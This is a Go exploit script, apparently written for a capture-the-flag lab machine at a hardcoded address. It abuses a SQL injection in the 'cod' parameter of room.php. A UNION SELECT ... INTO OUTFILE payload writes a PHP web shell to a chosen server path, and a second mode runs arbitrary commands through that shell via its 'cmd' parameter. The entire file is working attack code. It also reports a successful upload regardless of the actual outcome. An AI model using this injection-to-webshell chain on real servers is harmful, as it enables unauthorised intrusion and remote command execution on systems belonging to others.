package main

import (
	"flag"
	"fmt"
	"io"
	"net/http"
	"strings"
)

type Result struct {
	success bool
	result  string
}

type Exploit struct {
	Url     string
	UriPath string
}

func (e *Exploit) PrintResult(res Result) {
	if !res.success {
		fmt.Println("[-] Exploit failed!.... Abort")
		return
	}
	fmt.Printf("[+] Exploit result: %s \n", res.result)
}

func (e *Exploit) AccessURL(payload string) Result {
	payload = strings.ReplaceAll(payload, " ", "%20")
	fmt.Printf("[+] Payload: %s\n", payload)

	res := Result{
		success: false,
		result:  "",
	}

	sqliURL := fmt.Sprintf("%s%s%s", e.Url, e.UriPath, payload)
	resp, err := http.Get(sqliURL)
	if err != nil {
		fmt.Printf("[-] HTTP request failed for: %s\n", err)
		return res
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("[-] Failed to read the response body: %s\n", err)
		return res
	}

	res.success = true
	res.result = string(body)
	return res
}

func uploadWebshell(exploit *Exploit, filePath string) Result {
	fmt.Println("[+] Uploading Webshell --------------------------------------------------------------------------------------")

	payload := fmt.Sprintf("7 UNION ALL SELECT 1,'<?php system($_GET[\"cmd\"]);?>',3,4,5,6,7 INTO OUTFILE \"%s\";-- -", filePath)
	res := exploit.AccessURL(payload)
	res.result = "File uploaded successfully"

	return res
}

func runCommand(exploit *Exploit, fileName string, command string) Result {
	fmt.Println("[+] Running Command --------------------------------------------------------------------------------------")

	exploit.UriPath = fmt.Sprintf("/%s", fileName)
	payload := fmt.Sprintf("?cmd=%s", command)

	res := exploit.AccessURL(payload)
	return res
}

func main() {
	url := "http://10.10.10.143"
	uriPath := "/room.php?cod="
	exploit := Exploit{
		Url:     url,
		UriPath: uriPath,
	}

	filePath := flag.String("f", "", "Uploads the webshell into the given file path of the server")
	fileName := flag.String("n", "", "Filename to access the webshell")
	command := flag.String("c", "", "Command to run on the uploaded shell")
	flag.Parse()

	if *filePath == "" && *fileName == "" && *command == "" {
		usage := "Usage:\n" +
			"\tFor uploading the webshell to a file  path: go run exploit.go -f '/path/to/file.php'\n" +
			"\tFor running the command on the uploaded webshell: go run exploit.go -n 'file.php' -c 'id'\n"
		fmt.Println(usage)
		return
	}

	if *filePath != "" {
		res := uploadWebshell(&exploit, *filePath)
		exploit.PrintResult(res)
	}

	if *fileName != "" && *command != "" {
		res := runCommand(&exploit, *fileName, *command)
		exploit.PrintResult(res)
	}
}
